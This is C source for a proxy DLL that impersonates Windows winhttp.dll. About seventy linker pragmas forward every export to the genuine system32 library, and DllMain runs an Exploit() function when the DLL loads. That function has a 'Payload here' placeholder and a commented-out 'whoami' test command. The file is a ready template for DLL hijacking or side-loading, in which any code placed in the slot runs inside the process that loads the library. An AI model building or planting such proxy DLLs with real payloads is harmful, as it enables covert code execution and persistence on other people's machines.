#pragma comment(linker,"/export:DllCanUnloadNow=C:\\WINDOWS\\system32\\winhttp.DllCanUnloadNow,@3")
#pragma comment(linker,"/export:DllGetClassObject=C:\\WINDOWS\\system32\\winhttp.DllGetClassObject,@4")
#pragma comment(linker,"/export:Private1=C:\\WINDOWS\\system32\\winhttp.Private1,@5")
#pragma comment(linker,"/export:SvchostPushServiceGlobals=C:\\WINDOWS\\system32\\winhttp.SvchostPushServiceGlobals,@6")
#pragma comment(linker,"/export:WinHttpAddRequestHeaders=C:\\WINDOWS\\system32\\winhttp.WinHttpAddRequestHeaders,@7")
#pragma comment(linker,"/export:WinHttpAddRequestHeadersEx=C:\\WINDOWS\\system32\\winhttp.WinHttpAddRequestHeadersEx,@8")
#pragma comment(linker,"/export:WinHttpAutoProxySvcMain=C:\\WINDOWS\\system32\\winhttp.WinHttpAutoProxySvcMain,@9")
#pragma comment(linker,"/export:WinHttpCheckPlatform=C:\\WINDOWS\\system32\\winhttp.WinHttpCheckPlatform,@10")
#pragma comment(linker,"/export:WinHttpCloseHandle=C:\\WINDOWS\\system32\\winhttp.WinHttpCloseHandle,@11")
#pragma comment(linker,"/export:WinHttpConnect=C:\\WINDOWS\\system32\\winhttp.WinHttpConnect,@12")
#pragma comment(linker,"/export:WinHttpConnectionDeletePolicyEntries=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionDeletePolicyEntries,@13")
#pragma comment(linker,"/export:WinHttpConnectionDeleteProxyInfo=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionDeleteProxyInfo,@14")
#pragma comment(linker,"/export:WinHttpConnectionFreeNameList=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionFreeNameList,@15")
#pragma comment(linker,"/export:WinHttpConnectionFreeProxyInfo=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionFreeProxyInfo,@16")
#pragma comment(linker,"/export:WinHttpConnectionFreeProxyList=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionFreeProxyList,@17")
#pragma comment(linker,"/export:WinHttpConnectionGetNameList=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionGetNameList,@18")
#pragma comment(linker,"/export:WinHttpConnectionGetProxyInfo=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionGetProxyInfo,@19")
#pragma comment(linker,"/export:WinHttpConnectionGetProxyList=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionGetProxyList,@20")
#pragma comment(linker,"/export:WinHttpConnectionSetPolicyEntries=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionSetPolicyEntries,@21")
#pragma comment(linker,"/export:WinHttpConnectionSetProxyInfo=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionSetProxyInfo,@22")
#pragma comment(linker,"/export:WinHttpConnectionUpdateIfIndexTable=C:\\WINDOWS\\system32\\winhttp.WinHttpConnectionUpdateIfIndexTable,@23")
#pragma comment(linker,"/export:WinHttpCrackUrl=C:\\WINDOWS\\system32\\winhttp.WinHttpCrackUrl,@24")
#pragma comment(linker,"/export:WinHttpCreateProxyResolver=C:\\WINDOWS\\system32\\winhttp.WinHttpCreateProxyResolver,@25")
#pragma comment(linker,"/export:WinHttpCreateUrl=C:\\WINDOWS\\system32\\winhttp.WinHttpCreateUrl,@26")
#pragma comment(linker,"/export:WinHttpDetectAutoProxyConfigUrl=C:\\WINDOWS\\system32\\winhttp.WinHttpDetectAutoProxyConfigUrl,@27")
#pragma comment(linker,"/export:WinHttpFreeProxyResult=C:\\WINDOWS\\system32\\winhttp.WinHttpFreeProxyResult,@28")
#pragma comment(linker,"/export:WinHttpFreeProxyResultEx=C:\\WINDOWS\\system32\\winhttp.WinHttpFreeProxyResultEx,@29")
#pragma comment(linker,"/export:WinHttpFreeProxySettings=C:\\WINDOWS\\system32\\winhttp.WinHttpFreeProxySettings,@30")
#pragma comment(linker,"/export:WinHttpGetDefaultProxyConfiguration=C:\\WINDOWS\\system32\\winhttp.WinHttpGetDefaultProxyConfiguration,@31")
#pragma comment(linker,"/export:WinHttpGetIEProxyConfigForCurrentUser=C:\\WINDOWS\\system32\\winhttp.WinHttpGetIEProxyConfigForCurrentUser,@32")
#pragma comment(linker,"/export:WinHttpGetProxyForUrl=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyForUrl,@33")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlEx=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyForUrlEx,@34")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlEx2=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyForUrlEx2,@35")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlHvsi=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyForUrlHvsi,@36")
#pragma comment(linker,"/export:WinHttpGetProxyResult=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyResult,@37")
#pragma comment(linker,"/export:WinHttpGetProxyResultEx=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxyResultEx,@38")
#pragma comment(linker,"/export:WinHttpGetProxySettingsVersion=C:\\WINDOWS\\system32\\winhttp.WinHttpGetProxySettingsVersion,@39")
#pragma comment(linker,"/export:WinHttpGetTunnelSocket=C:\\WINDOWS\\system32\\winhttp.WinHttpGetTunnelSocket,@40")
#pragma comment(linker,"/export:WinHttpOpen=C:\\WINDOWS\\system32\\winhttp.WinHttpOpen,@41")
#pragma comment(linker,"/export:WinHttpOpenRequest=C:\\WINDOWS\\system32\\winhttp.WinHttpOpenRequest,@42")
#pragma comment(linker,"/export:WinHttpPacJsWorkerMain=C:\\WINDOWS\\system32\\winhttp.WinHttpPacJsWorkerMain,@1")
#pragma comment(linker,"/export:WinHttpProbeConnectivity=C:\\WINDOWS\\system32\\winhttp.WinHttpProbeConnectivity,@43")
#pragma comment(linker,"/export:WinHttpQueryAuthSchemes=C:\\WINDOWS\\system32\\winhttp.WinHttpQueryAuthSchemes,@44")
#pragma comment(linker,"/export:WinHttpQueryDataAvailable=C:\\WINDOWS\\system32\\winhttp.WinHttpQueryDataAvailable,@45")
#pragma comment(linker,"/export:WinHttpQueryHeaders=C:\\WINDOWS\\system32\\winhttp.WinHttpQueryHeaders,@46")
#pragma comment(linker,"/export:WinHttpQueryOption=C:\\WINDOWS\\system32\\winhttp.WinHttpQueryOption,@47")
#pragma comment(linker,"/export:WinHttpReadData=C:\\WINDOWS\\system32\\winhttp.WinHttpReadData,@48")
#pragma comment(linker,"/export:WinHttpReadProxySettings=C:\\WINDOWS\\system32\\winhttp.WinHttpReadProxySettings,@49")
#pragma comment(linker,"/export:WinHttpReadProxySettingsHvsi=C:\\WINDOWS\\system32\\winhttp.WinHttpReadProxySettingsHvsi,@50")
#pragma comment(linker,"/export:WinHttpReceiveResponse=C:\\WINDOWS\\system32\\winhttp.WinHttpReceiveResponse,@51")
#pragma comment(linker,"/export:WinHttpResetAutoProxy=C:\\WINDOWS\\system32\\winhttp.WinHttpResetAutoProxy,@52")
#pragma comment(linker,"/export:WinHttpSaveProxyCredentials=C:\\WINDOWS\\system32\\winhttp.WinHttpSaveProxyCredentials,@53")
#pragma comment(linker,"/export:WinHttpSendRequest=C:\\WINDOWS\\system32\\winhttp.WinHttpSendRequest,@54")
#pragma comment(linker,"/export:WinHttpSetCredentials=C:\\WINDOWS\\system32\\winhttp.WinHttpSetCredentials,@55")
#pragma comment(linker,"/export:WinHttpSetDefaultProxyConfiguration=C:\\WINDOWS\\system32\\winhttp.WinHttpSetDefaultProxyConfiguration,@56")
#pragma comment(linker,"/export:WinHttpSetOption=C:\\WINDOWS\\system32\\winhttp.WinHttpSetOption,@57")
#pragma comment(linker,"/export:WinHttpSetProxySettingsPerUser=C:\\WINDOWS\\system32\\winhttp.WinHttpSetProxySettingsPerUser,@58")
#pragma comment(linker,"/export:WinHttpSetSecureLegacyServersAppCompat=C:\\WINDOWS\\system32\\winhttp.WinHttpSetSecureLegacyServersAppCompat,@2")
#pragma comment(linker,"/export:WinHttpSetStatusCallback=C:\\WINDOWS\\system32\\winhttp.WinHttpSetStatusCallback,@59")
#pragma comment(linker,"/export:WinHttpSetTimeouts=C:\\WINDOWS\\system32\\winhttp.WinHttpSetTimeouts,@60")
#pragma comment(linker,"/export:WinHttpTimeFromSystemTime=C:\\WINDOWS\\system32\\winhttp.WinHttpTimeFromSystemTime,@61")
#pragma comment(linker,"/export:WinHttpTimeToSystemTime=C:\\WINDOWS\\system32\\winhttp.WinHttpTimeToSystemTime,@62")
#pragma comment(linker,"/export:WinHttpWebSocketClose=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketClose,@63")
#pragma comment(linker,"/export:WinHttpWebSocketCompleteUpgrade=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketCompleteUpgrade,@64")
#pragma comment(linker,"/export:WinHttpWebSocketQueryCloseStatus=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketQueryCloseStatus,@65")
#pragma comment(linker,"/export:WinHttpWebSocketReceive=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketReceive,@66")
#pragma comment(linker,"/export:WinHttpWebSocketSend=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketSend,@67")
#pragma comment(linker,"/export:WinHttpWebSocketShutdown=C:\\WINDOWS\\system32\\winhttp.WinHttpWebSocketShutdown,@68")
#pragma comment(linker,"/export:WinHttpWriteData=C:\\WINDOWS\\system32\\winhttp.WinHttpWriteData,@69")
#pragma comment(linker,"/export:WinHttpWriteProxySettings=C:\\WINDOWS\\system32\\winhttp.WinHttpWriteProxySettings,@70")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}